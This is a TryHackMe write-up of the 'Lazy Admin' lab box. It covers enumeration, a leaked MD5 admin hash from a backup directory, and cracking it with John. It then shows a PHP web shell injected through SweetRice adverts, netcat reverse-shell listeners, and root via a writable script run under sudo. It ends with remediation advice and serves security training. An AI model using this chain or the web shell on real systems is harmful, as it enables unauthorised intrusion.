# TryHackMe Write-up: Lazy Admin

**Machine Name:** Lazy Admin  
**Difficulty:** Easy    

---

## Summary / TL;DR

This Linux box uses the SweetRice CMS. Web enumeration revealed a /content/ installation with accessible backups. From the backup we recovered an MD5 admin password hash and the admin username (manager). Cracking the hash provided admin credentials to the CMS. Using the admin interface we injected a PHP reverse shell via the adverts functionality (vulnerable). With an initial www-data shell we found a sudo misconfiguration allowing the www-data user to run a Perl backup script as root. That script executed /etc/copy.sh, which was world-writable — editing it to include a reverse shell and running the allowed sudo command gave a root shell and the root flag.

## Reconnaissance

Identified two open services (HTTP and SSH).

```
nmap -sV -p- 10.10.x.x
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH ...
# 80/tcp open  http    Apache httpd ...

```

Visiting the webroot showed the default Apache/Ubuntu page. 

Directory brute-forcing revealed a content/ directory with the SweetRice CMS files and a login page under /content/as/.

Useful tools / commands used:

```
# Directory discovery
gobuster dir -u http://10.10.x.x/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50

# Target the content folder
gobuster dir -u http://10.10.x.x/content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak -t 50

```

## Backup Disclosure & Credentials Recovery

The 'content/inc/mysql_backup/' directory was accessible and contained SQL-like backup files. Inspecting the dump revealed an INSERT containing the serialized options array with the admin username and a password hash:

(redacted)
... s:"admin"; s:7:"manager"; s:"passwd"; s:32:"42f749ade7f9e195bf475f37a44cafcb"; ...

The 32-character hex string indicates an MD5 hash.

Save the hash and crack it with John or HashCat

```
echo "42f749ade7f9e195bf475f37a44cafcb" > /tmp/hash.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 /tmp/hash.txt
john --show /tmp/hash.txt

```
The cracked password (...) was used with username manager to log into the admin panel at /content/as/.

## Gaining Initial Access (RCE via Adverts)

1. **Vulnerability**
SweetRice's advert functionality allowed administrators to create adverts whose content could include PHP. Using the admin account we created a new advert and placed a PHP reverse shell (or a minimal <?php system($_GET['cmd']); ?>) as advert content.

2. **Trigger the shell**
The advert file was written to /content/inc/ads/hacked.php. Start a listener on your attacking machine:
```
nc -lvnp 4444

```
Then visit the advert URL to execute the PHP and get a www-data shell.

```
connect to [10.x.x.x] from (UNKNOWN) [10.10.x.x] 39592
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```



## Privilege Escalation to Root

1. **Check sudo previleges**
As www-data, run:

sudo -l

The output showed www-data can run /usr/bin/perl /home/itguy/backup.pl as root without a password:

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
2. **Inspect the script**
backup.pl executed /etc/copy.sh:
```
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

3. **Modify /etc/copy.sh (world-writable)**
/etc/copy.sh was writable. It either contained a reverse shell or was modifiable — edit it to call your listener, then run the allowed sudo command:

```
# on attacker
nc -lvnp 5554

# on target (as www-data)
sudo /usr/bin/perl /home/itguy/backup.pl
```
The above yields a root shell.

4. **Capture flags**
With root access, read /root/root.txt and any user flags such as /home/itguy/user.txt.


## Remediation & Mitigations

- Never expose backups or .git directories in web-accessible locations. Store backups outside the webroot and restrict access.

- Use proper password hashing (bcrypt/Argon2) with salts — MD5 is insecure.

- Harden upload/content features: sanitize inputs and disallow raw PHP injection through user-editable adverts or themes.

- Least privilege for web processes: avoid NOPASSWD sudo entries that the webserver user can invoke.

- Fix permissions for scripts in /etc: files executed by sudo should not be writable by unprivileged users.


## Conclusion

Lazy Admin demonstrates the danger of exposed backups, weak password storage, and overly permissive file permissions combined with unsafe sudo configuration. The exploitation chain is: disclosure → crack hash → admin login → PHP injection upload → initial shell → sudo misuse → root shell.
---